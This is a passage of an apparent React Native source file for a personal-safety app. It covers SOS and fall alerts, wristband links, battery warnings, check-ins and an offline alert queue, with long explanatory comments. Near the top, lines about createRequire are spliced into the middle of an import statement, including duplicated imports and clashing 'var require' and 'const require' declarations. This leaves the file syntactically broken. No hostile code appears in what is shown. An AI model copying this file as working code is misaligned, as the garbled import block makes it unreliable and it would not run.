import { StatusBar } from 'expo-status-bar';
import React, { useCallback, useEffect, useRef, useState } from 'react';
import {
  ActivityIndicator, AppState, Linking, Modal, Pressable, StyleSheet, Text,
  Vibration, View,
} from 'react-native';
import { ALERT_TIMEOUT, call, clearSession, loadSession, saveSession, useLive } from './src/api';
import { clearQueue, dequeue, enqueue, flushQueue, pendingCount, pressId } from './src/alertQueue';
import { MODES, useBandLink } from './src/bandLink';
import CheckinBanner from './src/components/CheckinBanner';
import FallCountdown, { FALL_WINDOW_S } from './src/components/FallCountdown';
import SamaritanCall from './src/components/SamaritanCall';
import { useAppFonts } from './src/fonts';
import Alerts from './src/screens/Alerts';
import Auth from './src/screens/Auth';
import Band from './src/screens/Band';
import Family from './src/screens/Family';
import Home from './src/screens/Home';
import Setup from './src/screens/Setup';
import UserShell from './src/screens/UserShell';
import DisarmPad from './src/screens/user/DisarmPad';
import { U } from './src/screens/user/kit';
import { SafeAreaRoot, useEdgeInsets } from './src/safeArea';
import { bandEventToAction, useSafetyMachine } from './src/state';
import { C, S, T, sevColor } from './src/theme';
import { Button, Chip, Icon, IconButton, Txt } from './src/ui';
import { lastKnownFix, useHeartbeat, usePhoneBattery, usePresence } from './src/watch';
import { stopBackgroundWatch, syncBackgroundWatch } from './src/bgService';
import { wantsBand } from './src/band';
import { registerBackgroundNotifications } from './src/bgNotifications';
import { activeAlarm, consumeLaunchAlertId, presentAlarm, stopAlarm } from './src/alarm';
import {
  consumePendingBandSos, startBandWake, stopBandWake, subscribeBandSos,
} from './src/bandWake';
import { runFirstRunAsks } from './src/permissions';
import {
import { createRequire } from 'module';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const require = createRequire(import.meta.url);

  DEFAULT_CHANNEL_ID, clearOwnSosNotification, registerPushToken,
  sendEmergencyAlarmIfNothingShown, setupNotificationChannels,
  showOwnSosNotification, subscribeNotificationTaps,
} from './src/notifications';

const TABS = [
  ['home',   'Home',   'home'],
  ['band',   'Band',   'watch'],
  ['family', 'Family', 'users'],
  ['alerts', 'Alerts', 'bell'],
  ['setup',  'Setup',  'settings'],
];

const TAKEOVER_TITLE = {
  sos: 'SOS', snatch: 'BAND TORN OFF', fall: 'FALL DETECTED',
  // Not "watch stopped reporting". That reads as a gadget fault, and a family
  // triages it like one; the fact worth acting on is that the phone went quiet
  // *while armed*, which is the state where silence is the signal.
  checkin_missed: 'MISSED CHECK-IN', watch_lost: 'WENT QUIET WHILE ARMED',
  going_dark: 'PHONE ABOUT TO DIE',
};

// Battery thresholds, from the acceptance matrix: 20 % tells the family, 5 %
// says the phone is about to stop being a safety device at all.
const BATT_LOW = 20;
const BATT_DARK = 5;

// Hysteresis on the re-arm, so a level sitting exactly on a threshold cannot
// page the family twice. Mirrors virtualBand.js, which has always had it.
const BATT_REARM = 3;

// The band's reading needs more than hysteresis. DEVELOPMENT_PLAN F2.3 records
// consecutive heartbeats alternating between 93% and 39% on one board, on one
// continuous `seq`: the divider's source impedance (~338k) is far too high for
// the SAADC's default acquisition window, so each conversion is dragged toward
// the previous one, and averaging 8 back-to-back reads does not help because
// every sample is equally under-settled.
//
// No hysteresis band survives a 54-point swing. Requiring N consecutive
// readings on the same side does -- an alternating signal never produces two
// in a row. This is a workaround for a firmware defect, not a fix; the fix is
// F2.3 (longer acquisition time, or median-of-N with a gap between samples).
const BAND_LOW_STREAK = 3;

// Local notifications are best-effort: Expo Go on Android has limits, and a
// demo cannot hinge on the notification shade. The in-app takeover below is
// the real signal; a notification is a bonus when the app is backgrounded.
let Notifications = null;
try {
  Notifications = require('expo-notifications');
  Notifications.setNotificationHandler({
    handleNotification: async () => ({
      shouldShowBanner: true, shouldShowList: true,
      shouldPlaySound: true, shouldSetBadge: false,
    }),
  });
} catch { /* not available; in-app alerts still work */ }

async function notify(title, body) {
  if (!Notifications) return;
  try {
    const p = await Notifications.getPermissionsAsync();
    if (!p.granted) {
      const r = await Notifications.requestPermissionsAsync();
      if (!r.granted) return;
    }
    await Notifications.scheduleNotificationAsync({
      content: { title, body, sound: true },
      // Same reason as the emergency channel: setupNotificationChannels creates
      // this one with the check-in vibration pattern, and the channel is picked
      // by the trigger. `trigger: null` quietly used Android's own default.
      trigger: { channelId: DEFAULT_CHANNEL_ID },
    });
  } catch { /* best effort */ }
}

function Main() {
  const [booting, setBooting] = useState(true);
  const [session, setSession] = useState(null);
  const [tab, setTab] = useState('home');
  const [refreshKey, setRefreshKey] = useState(0);

  const [incoming, setIncoming] = useState(null);     // family emergency takeover
  const [askSheet, setAskSheet] = useState(null);     // the check-in question
  const [samaritan, setSamaritan] = useState(null);   // a stranger nearby
  const [deliveredTo, setDeliveredTo] = useState(null);
  const [deliveryStatus, setDeliveryStatus] = useState(null); // null | 'queued' | 'sending' | 'delivered'
  const [toast, setToast] = useState(null);
  const [fix, setFix] = useState(null);               // last position, from Home
  const [pendingAlertId, setPendingAlertId] = useState(null); // { id, answered } from a notification

  const { state, ctx, dispatch, is, watchMode } = useSafetyMachine();
  const insets = useEdgeInsets();
  const bump = useCallback(() => setRefreshKey((k) => k + 1), []);

  useEffect(() => {
    (async () => {
      await setupNotificationChannels();
      // If a full-screen intent is what put this app on screen, the alert it
      // was about is sitting in the launch intent. Read it before anything
      // else can replace the intent, and hand it to the same routing the
      // notification tap uses.
      const launched = await consumeLaunchAlertId();
      if (launched) setPendingAlertId(launched);
      const s = await loadSession();
      setSession(s);
      // The foreground service is no longer started here. Signing in is not
      // by itself a reason to hold a process alive; holding a band link or
      // being armed is. The effect below owns that and runs on this launch.
      setBooting(false);
    })();
  }, []);

  // The role lives on the server row, never on the phone.
  //
  // It is read once at sign-in and then cached alongside the token, so an
  // account promoted to admin in the database would otherwise keep the
  // end-user shell until somebody thought to sign out and back in. Re-read it
  // on every launch, and write the answer back so the next cold start is
  // already right even with no network.
  const [roleTick, setRoleTick] = useState(0);
  useEffect(() => {
    if (!session?.token) return undefined;
    let cancelled = false;
    (async () => {
      try {
        const who = await call(session, '/me');
        // Only an explicit role is allowed to change anything. A server that
        // does not send the field at all -- an older build, or one that has
        // not been restarted since this endpoint learned to return it -- is
        // saying nothing about the role, not saying "user", and treating the
        // two the same demotes an admin one tick after they sign in.
        const role = typeof who?.role === 'string' ? who.role : null;
        if (cancelled || !role || role === session.role) return;
        const next = { ...session, role };
        setSession(next);
        await saveSession(next);
      } catch { /* offline: the cached role stands */ }
    })();
    return () => { cancelled = true; };
  }, [session?.token, session?.url, session?.role, roleTick]);

  // Coming back to the app counts as a launch for this purpose. Somebody
  // changing a role in the database and then reaching for the phone should not
  // have to kill it first to see the difference.
  useEffect(() => {
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') setRoleTick((n) => n + 1);
    });
    return () => sub.remove();
  }, []);

  // Tapping the push is how a killed app is opened at all, so the tap has to
  // land on the alert rather than a bare Home screen. The listener can fire
  // before `session` is ready (cold start), so it only records which alert
  // was tapped; the effect below does the fetch once a session exists.
  //
  // A tap on the push body is never an answer -- only the alarm notification's
  // own I'M ON IT button is, and that arrives through consumeLaunchAlertId.
  useEffect(() => subscribeNotificationTaps(
    (id) => setPendingAlertId({ id, answered: false })
  ), []);

  // Coming back to the app is the other half of the launch read, and for a long
  // time it was missing.
  //
  // The read above runs once, at boot. But MainActivity is singleTask, so when
  // the app is merely backgrounded -- which it usually is, the family member
  // opened it this morning -- Android does not restart it. It hands the alarm
  // notification's intent to `onNewIntent` instead, and nothing was ever asking
  // for that. So the one gesture the notification exists for, pressing it,
  // brought the app to the front on whatever tab it was left on, with the siren
  // still sounding and no takeover anywhere: no name, no map, no way to answer.
  //
  // `activeAlarm` is the second question, for the person who reaches past the
  // notification and opens the app from its icon. Neither of those intents
  // carries an alert id; the siren itself is the only thing that knows.
  useEffect(() => {
    const sub = AppState.addEventListener('change', async (next) => {
      if (next !== 'active') return;
      const hit = (await consumeLaunchAlertId()) || (await activeAlarm());
      if (hit) setPendingAlertId(hit);
    });
    return () => sub.remove();
  }, []);

  useEffect(() => {
    if (!pendingAlertId) return;
    // No session to fetch the alert with. While booting that is only "not yet",
    // so wait; once boot is done it is final, and the id has to be dropped
    // rather than held -- a held id keeps the siren armed forever, because the
    // stop below refuses to fire while one is outstanding.
    if (!session) {
      if (!booting) setPendingAlertId(null);
      return;
    }
    const { id, answered } = pendingAlertId;
    (async () => {
      try {
        const list = await call(session, '/alerts?scope=incoming');
        const alert = list.find((a) => String(a.id) === String(id));
        if (alert && !alert.resolved_at) {
          setIncoming(alert);
          setTab('home');
          // They already said they were going -- on the notification, before the
          // app was even open. The takeover still comes up, because "who and
          // where" is the next thing they need, but the family is told now
          // rather than after a second press of a button they have pressed.
          if (answered) {
            try {
              await call(session, `/alert/${alert.id}/ack`, { method: 'POST' });
              bump();
            } catch { /* the socket tells them when it reconnects */ }
          }
        }
      } catch { /* the in-app takeover still works once the socket catches up */ }
      setPendingAlertId(null);
    })();
  }, [pendingAlertId, session, booting, bump]);

  // Ask for what the app needs at the point somebody has an account and is
  // looking at the screen -- not on a Setup tab they may never open. Two rungs,
  // once per install; runFirstRunAsks says what is deliberately left out of it
  // and who asks for those instead.
  useEffect(() => {
    if (!session?.token) return;
    runFirstRunAsks();
  }, [session?.token]);

  // Keyed on the session rather than done once at boot. Registering only on
  // mount meant somebody who had just signed in had no push token on the
  // server until they next launched the app -- so the first alert after
  // pairing, the one most likely to be a real test, reached nothing. It also
  // re-runs on a token change, which is when a rotated push token gets filed.
  useEffect(() => {
    if (!session?.token) return;
    registerPushToken(session);
    // The silent push that fires the lock-screen alarm is delivered to a task,
    // not to a listener, and an unregistered task is simply never run. Doing it
    // here rather than at boot means it is also re-registered for whoever signs
    // in next on a shared phone.
    registerBackgroundNotifications();
  }, [session?.token, session?.url]);

  // The one place the alarm is stopped.
  //
  // Every exit out of the takeover -- "I'M ON IT", "Dismiss", and the wearer
  // standing the alert down from their own phone -- ends by clearing
  // `incoming`, so hanging the stop off that rather than off each button is
  // what makes it impossible to add a fourth exit that leaves a siren running.
  //
  // It also fires on mount, which is deliberate: the alarm notification is
  // ongoing and survives the process, so an app killed mid-siren would come
  // back to a notification it no longer has any way to clear.
  //
  // But that mount fire must not silence the alarm that *opened* this app. The
  // lock-screen takeover launches us cold with the siren already sounding, and
  // `incoming` cannot be set yet -- the alert id still has to be read off the
  // launch intent, the session loaded, and the row fetched. Firing before all
  // of that killed the siren about a second in and left the takeover on screen
  // silent. So the stop waits until nothing is still on its way: `booting`
  // covers the intent read, `pendingAlertId` covers the fetch, and both clear
  // even when they find nothing, which is when there really is a stale siren
  // to cut.
  useEffect(() => {
    if (booting || pendingAlertId || incoming) return;
    stopAlarm();
  }, [incoming, pendingAlertId, booting]);

  useEffect(() => {
    if (!toast) return undefined;
    const t = setTimeout(() => setToast(null), 4500);
    return () => clearTimeout(t);
  }, [toast]);

  // ---- raising and standing down -----------------------------------------
  // The band, reachable from `raise` below, which is defined before the link
  // exists. A ref rather than a dependency because a buzz is fire-and-forget:
  // rebuilding `raise` every time the band's battery ticks would be a lot of
  // churn for a call that never reads anything back.
  const bandRef = useRef(null);

  const raise = useCallback(async (payload) => {
    if (!session) return null;

    // Capture the GPS fix at the moment the button is pressed — Point A.
    // This is where the emergency happened, not wherever the phone drifts
    // to while waiting for signal.
    const at = fix || await lastKnownFix();

    // The id of this press, minted here and not one line later. It goes out on
    // the FIRST attempt, which is the one that matters: the duplicate SOS came
    // from an attempt that reached the server, inserted the row and paged the
    // family, and then took longer to answer than the phone was willing to
    // wait. Every retry now carries the same id and the server recognises it.
    const clientId = pressId();
    const body = {
      lat: at?.lat, lon: at?.lon, accuracy: at?.acc, client_id: clientId, ...payload,
    };
    const isEmergency = ['sos', 'snatch', 'fall'].includes(payload.kind);

    // LOCAL-FIRST: fire the state machine and vibrate immediately, before
    // the network call. The user must know their button press registered,
    // and the SOS screen must appear even with no connectivity at all.
    const localAlert = {
      id: `pending-${Date.now()}`,
      kind: payload.kind,
      source: payload.source || 'app',
      created_at: Date.now() / 1000,
      lat: at?.lat, lon: at?.lon,
      _local: true,  // marker: not yet confirmed by the server
    };
    if (isEmergency) {
      dispatch('SOS_RAISED', { alert: localAlert });
      setDeliveredTo(null);
      setDeliveryStatus('queued');
      Vibration.vibrate([0, 300, 120, 300]);

      // The confirmations that do not need this screen to exist.
      //
      // When the band raises an SOS with the app swiped out of Recents, this
      // function still runs: the process is alive, the vibration is felt, and
      // the alert below reaches the server. Only the dispatch above is inert,
      // because the reducer it targets died with the activity. So the wrist and
      // the notification shade are where the wearer is actually told -- and
      // they are the two places that were saying nothing at all.
      bandRef.current?.send?.({ c: 'buzz', n: 3 });
      showOwnSosNotification(localAlert);
    }

    // Now try the network call.
    try {
      const r = await call(session, '/alert', {
        method: 'POST', body, timeout: ALERT_TIMEOUT,
      });
      if (isEmergency) {
        // Replace the local placeholder with the real server alert.
        dispatch('SOS_RAISED', { alert: r.alert });
        setDeliveredTo(r.delivered_to);
        setDeliveryStatus('delivered');
      }
      if (payload.kind !== 'near_miss') {
        setToast(r.delivered_to
          ? `Sent to ${r.delivered_to} family member${r.delivered_to === 1 ? '' : 's'}`
          : 'Nobody is in your family list yet — add someone first');
      }
      bump();
      return r.alert;
    } catch (e) {
      if (isEmergency) {
        // Network failed — queue for retry. The SOS screen is already live
        // from the local-first dispatch above.
        //
        // The queue's own id becomes the alert's id from here on. Without that
        // the screen held a `pending-…` id with no way back to the row in
        // storage, so cancelling had nothing to aim at and cleared the entire
        // queue -- a queued fall plus a queued SOS meant standing down either
        // one silently threw away the other.
        const queuedId = await enqueue(body);
        dispatch('SOS_RAISED', { alert: { ...localAlert, id: queuedId } });
        setDeliveryStatus('queued');
        setToast('No signal — your alert is saved and will send automatically when connection returns');
      } else {
        setToast(e.message);
      }
      return null;
    }
  }, [session, fix, dispatch, bump]);

  const resolve = useCallback(async (id) => {
    try {
      if (!id || String(id).startsWith('pending-') || String(id).startsWith('local-')) {
        // One item, not the lot. `local-…` is a real row in the queue and is
        // removed by id; `pending-…` never reached storage at all, so there is
        // nothing to remove and anything else waiting there belongs to a
        // different emergency.
        if (String(id).startsWith('local-')) await dequeue(id);
        dispatch('SOS_CLEARED');
        setDeliveredTo(null);
        setDeliveryStatus(null);
        clearOwnSosNotification();
        setToast('Cancelled — alert was not sent yet');
        bump();
        return;
      }
      await call(session, `/alert/${id}/resolve`, { method: 'POST' });
      dispatch('SOS_CLEARED');
      setDeliveredTo(null);
      setDeliveryStatus(null);
      // The notification is sticky by design, so nothing else will ever take it
      // down. An "SOS is active" sitting on the lock screen after the wearer
      // stood it down is the same lie as the screen showing nothing during one.
      clearOwnSosNotification();
      setToast('Stood down — your family has been told');
      bump();
    } catch (e) {
      setToast(e.message);
    }
  }, [session, dispatch, bump]);

  const ackCheckin = useCallback(async (checkin) => {
    if (!session) return;
    setAskSheet(null);
    try {
      // Prefer the specific row. Falling back to a plain `checkin_ack` alert is
      // not a nicety: a buzz that arrived while the socket was down has no id
      // here, and the server closes every open question either way.
      if (checkin?.checkin_id) {
        await call(session, `/checkin/${checkin.checkin_id}/ack`, { method: 'POST' });
      } else {
        await call(session, '/alert', { method: 'POST', body: { kind: 'checkin_ack', source: 'app' } });
      }
      dispatch('CHECKIN_CLOSED');
      setToast('Answered — your family can see you are fine');
      bump();
    } catch (e) {
      setToast(e.message);
    }
  }, [session, dispatch, bump]);

  const toggleHighAlert = useCallback(async (on) => {
    if (!session) return;
    try {
      const r = await call(session, '/watch/high_alert', { method: 'POST', body: { on } });
      dispatch('HIGH_ALERT_SET', { on, nextBuzzAt: r.next_buzz_at || null });
      setToast(on
        ? 'High Alert armed — the server checks on you even if this app is closed'
        : 'High Alert off');
      bump();
    } catch (e) {
      // Say what actually happened. A band that buzzed twice while the server
      // never heard is worse than a plain failure, because the wearer now
      // believes she is being watched.
      setToast(`Could not reach the server — High Alert is NOT ${on ? 'on' : 'off'}`);
    }
  }, [session, dispatch, bump]);

  // ---- the band drives the same actions ----------------------------------
  const ctxRef = useRef(ctx);
  ctxRef.current = ctx;
  const stateRef = useRef(state);
  stateRef.current = state;

  const onBandEvent = useCallback((ev) => {
    const action = bandEventToAction(ev);
    if (!action) return;

    if (action.type === 'FALL_DETECTED') {
      if (stateRef.current === 'sos_live') return;      // already the worst case
      dispatch('FALL_DETECTED', {
        severity: 4, note: action.note,
        endsAt: Date.now() + FALL_WINDOW_S[4] * 1000,
      });
      return;
    }

    if (action.type === 'SOS_RAISED') {
      if (!ctxRef.current.activeSos) {
        raise({ kind: ev.e === 'snatch' ? 'snatch' : 'sos', source: 'band', note: ev.src || '' });
      }
      return;
    }

    if (action.type === 'CHECKIN_CLOSED') {
      // Key 1 is "I'm fine": it stands down a live alert, otherwise it answers
      // the open question. Start and stop from the band, with no firmware change.
      const live = ctxRef.current.activeSos;
      if (live) resolve(live.id);
      else ackCheckin(ctxRef.current.checkin);
      return;
    }

    if (action.type === 'CHECKIN_EXPIRED') {
      // The band gave up nagging. The server is the one escalating, so all
      // this does is stop the wearer wondering: the buzzing stopped, and
      // nothing on screen would otherwise say why.
      dispatch('CHECKIN_EXPIRED');
      setToast('The check-in window has passed — your family is being told. '
               + 'Answering now still tells them you are fine.');
      return;
    }

    if (action.type === 'HIGH_ALERT_SET') {
      // The band's hold-3s is only the switch; the mode itself is server-owned
      // so that it outlives this app being killed.
      toggleHighAlert(action.on);
    }
  }, [dispatch, raise, resolve, ackCheckin, toggleHighAlert]);

  const band = useBandLink(onBandEvent);
  bandRef.current = band;

  // Two separate things need this app's Android process alive, and the service
  // is the only thing that keeps it alive once the app is off screen or swiped
  // out of Recents. Either one on its own is enough to justify it:
  //
  //   1. A linked band. The GATT link belongs to the process, so when the
  //      process dies the band drops back to advertising -- the blinking light.
  //   2. Being armed at all. useHeartbeat only beats while mode != 'idle', and
  //      the server's watchdog pages the whole family with watch_lost after
  //      BEAT_LOST_S of silence in exactly that state. Kill the process of an
  //      armed phone and it reports its own wearer missing. That applies to
  //      virtual mode especially, where the phone *is* the band and there is no
  //      stored band id to find.
  //
  // Condition 2 is why this cannot simply ask "does this phone want a band".
  //
  // What must *not* be used is the live connection. A band out of range is
  // exactly when band.js's retry loop needs the process alive; stopping the
  // service there would kill the thing doing the reconnecting. band.status is
  // in the dependency list as a trigger only -- it changes at both moments the
  // stored flag does (connected when the id is written, idle when DISCONNECT
  // clears it), which re-runs the read without band.js having to know the
  // service exists at all.
  useEffect(() => {
    // Before the stored mode loads every launch looks like virtual mode -- the
    // same trap bandLink.js's autoLink had. Acting on that default would stop
    // the service for a moment on every launch of a band-wearer's phone.
    if (!band.modeLoaded) return undefined;

    let cancelled = false;
    (async () => {
      // Armed is decisive on its own and needs no storage read, so it is
      // answered first: there is no band state that makes it safe to let an
      // armed phone's process die.
      if (watchMode !== 'idle') { syncBackgroundWatch(!!session); return; }

      // Idle from here. Only a band the user still wants keeps the service up;
      // DISCONNECT clears that id, and virtual mode has none to begin with.
      if (band.mode !== MODES.BLE) { syncBackgroundWatch(false); return; }

      const wanted = await wantsBand();
      if (cancelled) return;
      // null means the read failed. Passed through so syncBackgroundWatch
      // leaves the service alone rather than tearing down a live link over it.
      syncBackgroundWatch(wanted === null ? null : (!!session && wanted));
    })();
    return () => { cancelled = true; };
  }, [session, band.status, band.mode, band.modeLoaded, watchMode]);

  // ---- the band's own way in, for when this process is gone ---------------
  //
  // The foreground service above is the app's attempt to stay alive. On most
  // non-Samsung skins it loses: a swipe on the Recents screen is `kill -9`, and
  // the GATT link dies with the process. From that moment the band looks linked
  // and can reach nobody, which is the exact state a wearer walks out in.
  //
  // So the SOS also goes out in the band's advertisement, and the scan that
  // matches it is registered with Android rather than held by us -- it outlives
  // the kill. See src/bandWake.js.
  //
  // Armed on the same standing instruction the link itself runs on, and
  // deliberately NOT on `session`: a signed-out phone still wants the press
  // written down, and the pending record waits for a session rather than being
  // thrown away. Not on `band.status` either -- an out-of-range band is when
  // this matters most, and disarming then would remove the one path still
  // capable of carrying the alert.
  useEffect(() => {
    if (!band.modeLoaded) return undefined;
    if (band.mode !== MODES.BLE) { stopBandWake(); return undefined; }

    let cancelled = false;
    (async () => {
      const wanted = await wantsBand();
      if (cancelled || wanted === null) return;   // read failed: change nothing
      if (wanted) await startBandWake(); else await stopBandWake();
    })();
    return () => { cancelled = true; };
  }, [band.mode, band.modeLoaded, band.status]);

  // What to do with a press that came in over the advertisement.
  //
  // It goes through `raise` like every other SOS: the same GPS fix, the same
  // offline queue, the same family fan-out. A second code path for the
  // emergency case would be the one nobody ever exercises.
  const raiseBeaconSos = useCallback(async (hit) => {
    if (!hit) return;
    // Too old to escalate on its own. The wearer is still told -- a press that
    // went nowhere is exactly what they need to know about -- but a family is
    // not paged about something that happened before lunch.
    if (hit.stale) {
      setToast('Your band called for help while the app was closed, too long ago '
             + 'to send now. Press SOS again if you still need help.');
      return;
    }
    await raise({
      kind: 'sos',
      source: 'band',
      note: 'band beacon — the app was not running',
    });
  }, [raise]);

  // Held in a ref, and the two effects below depend on the token rather than on
  // the handler.
  //
  // `raise` closes over `fix`, which is replaced on every GPS update. Depending
  // on the handler directly would therefore tear the subscription down and
  // rebuild it every few seconds, and a press landing in one of those gaps
  // would find no listener -- so it would fall through to the notification
  // route on a phone where the app was in fact wide awake. The ref keeps the
  // newest handler without moving the subscription.
  const beaconSosRef = useRef(raiseBeaconSos);
  beaconSosRef.current = raiseBeaconSos;

  // Arriving while JS is alive: no notification, the alert simply goes.
  useEffect(() => {
    if (!session?.token) return undefined;
    return subscribeBandSos((hit) => beaconSosRef.current?.(hit));
  }, [session?.token]);

  // Arriving while the app was dead. The press was written to storage by a
  // receiver in a process that no longer exists; this is the first moment
  // anything can act on it. Checked on every resume as well as at boot,
  // because Android may bring the app back without a fresh mount.
  useEffect(() => {
    if (!session?.token) return undefined;
    const check = async () => {
      const hit = await consumePendingBandSos();
      if (hit) beaconSosRef.current?.(hit);
    };
    check();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') check();
    });
    return () => sub.remove();
  }, [session?.token]);

  // ---- U3.4 battery: one alert per threshold crossing, per device --------
  //
  // Two cells, watched separately. They used to be one number: `band.battery`
  // was raised as `going_dark` and shown to the family as "phone about to
  // die", so in BLE mode a wearer at 4% band and 90% phone paged his family
  // about the wrong device -- and a wearer whose phone was genuinely dying
  // said nothing at all, because the phone's own battery was never read.
  //
  // The distinction is not cosmetic. A flat band means the safety device is
  // off the air while the phone can still be reached by push; a flat phone
  // means every path to the family is about to close, including that push.
  // Hence going_dark at severity 3 against band_battery at 1.
  const phoneBatt = usePhoneBattery();
  const battLatch = useRef({ phoneLow: false, phoneDark: false, bandLow: false });

  useEffect(() => {
    const level = phoneBatt;
    if (level == null) return;                 // unknown is not the same as empty
    const low = level <= BATT_LOW;
    const dark = level <= BATT_DARK;

    if (dark && !battLatch.current.phoneDark) {
      battLatch.current.phoneLow = true;
      battLatch.current.phoneDark = true;
      raise({ kind: 'going_dark', source: 'app', note: `phone ${Math.round(level)}%` });
      setToast('Phone battery critical — your family has been told where you were');
    } else if (low && !battLatch.current.phoneLow) {
      battLatch.current.phoneLow = true;
      raise({ kind: 'low_battery', source: 'app', note: `phone ${Math.round(level)}%` });
    } else if (level > BATT_LOW + BATT_REARM) {
      battLatch.current.phoneLow = false;
      battLatch.current.phoneDark = false;     // charged: arm it again
    }
    dispatch('BATTERY', { level, low, goingDark: dark });
  }, [phoneBatt, raise, dispatch]);

  // The band's own cell. Only in BLE mode: in virtual mode `band.battery` is
  // this same phone read through expo-battery, so raising it here would page
  // the family twice for one battery.
  //
  // Debounced over consecutive readings rather than latched on one, because
  // this number is known to alternate -- see BAND_LOW_STREAK above. A single
  // reading below the threshold means nothing here.
  const bandLowStreak = useRef(0);
  useEffect(() => {
    if (band.mode !== MODES.BLE) return;
    const level = band.battery;
    if (level == null) return;

    if (level <= BATT_LOW) {
      bandLowStreak.current += 1;
      if (bandLowStreak.current >= BAND_LOW_STREAK && !battLatch.current.bandLow) {
        battLatch.current.bandLow = true;
        raise({ kind: 'band_battery', source: 'app', note: `band ${Math.round(level)}%` });
      }
    } else {
      bandLowStreak.current = 0;
      if (level > BATT_LOW + BATT_REARM) {
        battLatch.current.bandLow = false;     // charged: arm it again
      }
    }
  }, [band.battery, band.mode, raise]);

  // The server's watchdog listens for silence, so the phone speaks while
  // anything is armed. N2's foreground service is what keeps this going once
  // Android backgrounds the app.
  useHeartbeat(session, {
    mode: watchMode,
    bandLink: band.status === 'connected' || band.status === 'virtual',
    // Never substituted for one another. In virtual mode there is no second
    // cell, so bandBatt is null rather than a copy of the phone's reading.
    bandBatt: band.mode === MODES.BLE ? band.battery : null,
    phoneBatt,
    virtual: band.mode !== MODES.BLE,
  });

  // Presence is what makes the Good Samaritan fan-out possible at all: it is
  // the only way the server can know who is close to somebody else's emergency.
  usePresence(session, fix);

  // ---- live socket --------------------------------------------------------
  const serverOnline = useLive(session, {
    alert: (m) => {
      const a = m.alert;
      if (a.severity >= 4) {
        setIncoming(a);
        // N3.3/N3.4. On a dev or production build this is a real full-screen
        // intent plus a looping siren, so a backgrounded app takes the lock
        // screen over instead of waiting to be noticed. It returns false in
        // Expo Go and on web, where the native module is not in the binary --
        // there the old notification is still the best available signal.
        presentAlarm(a).then((took) => {
          // Not `sendEmergencyAlarmNotification` directly. The same alert also
          // arrives as a visible push and as a silent push that wakes the
          // background task, and this path is the only one that used to post
          // without first looking at what was already on screen -- which is
          // exactly why one SOS showed up two and three times with the app
          // open, and behaved itself with the app killed.
          if (!took) sendEmergencyAlarmIfNothingShown(a);
        });
      } else {
        notify(`${a.user.name} — ${a.kind.replace('_', ' ')}`,
               a.maps ? 'Tap to open the app and see their location.' : 'Open the app for details.');
      }
      bump();
    },
    resolved: (m) => {
      setIncoming((cur) => (cur && cur.id === m.alert_id ? null : cur));
      setToast(`${m.user.name} is safe — they stood the alert down`);
      bump();
    },
    ack: (m) => {
      // `m.at` is the server's clock. Falling back to arrival time is only for
      // a phone talking to a server older than this change.
      dispatch('RESPONDER', { by: m.by, at: m.at });
      setToast(m.samaritan
        ? `${m.by.name} is nearby and on the way`
        : `${m.by.name} has seen your alert and is responding`);
    },
    checkin_req: (m) => {
      const checkin = {
        ...m.from, checkin_id: m.checkin_id, window: m.window || 90,
        due_at: m.due_at, _startAt: Date.now() / 1000,
      };
      dispatch('CHECKIN_ASKED', { checkin });
      setAskSheet(checkin);
      Vibration.vibrate([0, 200, 100, 200]);
      band.send({ c: 'checkin_req', window: m.window ?? 45 });
      notify(`${m.from.name} is checking on you`, 'Tap "I am fine" to answer.');
    },
    // The sweeper's own knock, on the server's schedule rather than anyone's
    // thumb. It looks the same to the wearer, which is the point.
    buzz_now: (m) => {
      const checkin = {
        name: null, system: true, reason: m.reason, checkin_id: m.checkin_id,
        window: m.window || 90, due_at: m.due_at, _startAt: Date.now() / 1000,
      };
      dispatch('CHECKIN_ASKED', { checkin });
      if (m.next_buzz_at) dispatch('NEXT_BUZZ', { at: m.next_buzz_at });
      setAskSheet(checkin);
      Vibration.vibrate([0, 400, 200, 400]);
      band.send({ c: 'checkin_req', window: m.window ?? 90 });
      notify('Nigehban is checking on you', 'Tap "I am fine" to answer.');
    },
    checkin_ack: (m) => setToast(`${m.by.name} answered — they are fine`),
    watch_updated: () => bump(),
    samaritan: (m) => {
      setSamaritan(m.alert);
      Vibration.vibrate([0, 300, 150, 300]);
      notify('Someone near you needs help',
             'A Nigehban emergency was raised close by. Open the app if you can go.');
    },
    samaritan_on_way: (m) => setToast(`${m.by.name} is nearby and heading there`),
    invite: (m) => {
      setToast(`${m.invite.from.name} is asking to be your family — open FAMILY to answer`);
      notify(`${m.invite.from.name} wants to be your family`,
             'Nothing is shared until you accept.');
      bump();
    },
    family_added: (m) => { setToast(`${m.user.name} is now in your family`); bump(); },
  });

  // ---- offline queue: every chance to flush it ----------------------------
  //
  // The rising edge of the WebSocket was the only trigger, and it is the one
  // that cannot fire when it matters most: the socket lives in this tree, so a
  // phone whose app is off screen when signal returns reconnects nothing and
  // delivers nothing until somebody opens it. Four triggers now, because each
  // covers a case the others cannot:
  //
  //   1. the socket's rising edge   -- app open, signal returns
  //   2. coming back to the app     -- reopened after being backgrounded
  //   3. a timer while anything is queued -- app open but the socket is not
  //      the thing that came back (captive portal, server restarted)
  //   4. the foreground service's tick -- app closed entirely; see bgService
  //
  // Two of these firing together would send the same alert twice, and a family
  // paged twice for one press is how a real one gets ignored. There are two
  // guards against that now, at different depths: `flushing` below keeps this
  // screen from doing redundant work, the queue's own interlock covers the
  // background service that this ref cannot see, and `client_id` makes a
  // duplicate that gets through harmless at the server. The last one is the
  // only one that survives the app being killed mid-send.
  const flushing = useRef(false);
  const flushNow = useCallback(async () => {
    if (!session || flushing.current) return;
    flushing.current = true;
    try {
      const { delivered } = await flushQueue(session);
      if (delivered.length > 0) {
        const last = delivered[delivered.length - 1];
        const count = last.response?.delivered_to;
        // Replace the local placeholder with the real server alert.
        if (last.response?.alert) {
          dispatch('SOS_RAISED', { alert: last.response.alert });
        }
        setDeliveredTo(count ?? null);
        setDeliveryStatus('delivered');
        setToast(count
          ? `Your alert has been delivered to ${count} family member${count === 1 ? '' : 's'}`
          : 'Your alert has been sent to the server');
        bump();
        return;
      }
      // Nothing delivered here does not mean nothing was delivered. The
      // background flush may have emptied the queue while this screen was
      // gone, and a live SOS screen still reading "waiting for signal" after
      // the alert has actually gone out is the wrong kind of wrong.
      if ((await pendingCount()) === 0) {
        setDeliveryStatus((cur) => (cur === 'queued' ? 'delivered' : cur));
      }
    } finally {
      flushing.current = false;
    }
  }, [session, dispatch, bump]);

  const prevOnline = useRef(false);
